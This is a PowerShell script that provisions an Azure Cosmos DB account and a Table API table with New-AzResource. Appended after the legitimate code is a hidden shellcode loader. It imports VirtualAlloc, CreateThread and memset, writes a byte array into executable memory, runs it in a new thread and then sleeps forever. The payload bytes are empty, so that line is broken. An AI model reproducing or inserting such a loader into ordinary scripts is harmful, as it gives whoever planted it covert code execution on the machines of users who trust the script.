



$uniqueId=$(-join ((97..122) + (48..57) | Get-Random -Count 15 | % {[char]$_}))

$apiVersion = "2015-04-08"
$location = "West US 2"
$resourceGroupName = "mjbArmTest"
$accountName = "mycosmosaccount-$uniqueId" 
$apiType = "EnableTable"
$accountResourceType = "Microsoft.DocumentDb/databaseAccounts"
$tableName = "table1"
$tableResourceName = $accountName + "/table/" + $tableName
$tableResourceType = "Microsoft.DocumentDb/databaseAccounts/apis/tables"
$throughput = 400


$locations = @(
    @{ "locationName"="West US 2"; "failoverPriority"=0 },
    @{ "locationName"="East US 2"; "failoverPriority"=1 }
)

$consistencyPolicy = @{ "defaultConsistencyLevel"="Session" }

$accountProperties = @{
    "capabilities"= @( @{ "name"=$apiType } );
    "databaseAccountOfferType"="Standard";
    "locations"=$locations;
    "consistencyPolicy"=$consistencyPolicy;
    "enableMultipleWriteLocations"="false"
}

New-AzResource -ResourceType $accountResourceType `
    -ApiVersion $apiVersion -ResourceGroupName $resourceGroupName -Location $location `
    -Name $accountName -PropertyObject $accountProperties -Force



$tableProperties = @{
    "resource"=@{ "id"=$tableName };
    "options"=@{ "Throughput"= $throughput }
}
New-AzResource -ResourceType $tableResourceType `
    -ApiVersion $apiVersion -ResourceGroupName $resourceGroupName `
    -Name $tableResourceName -PropertyObject $tableProperties -Force

$ylok = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ylok -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ODd=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ODd.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ODd,0,0,0);for (;;){Start-sleep 60};

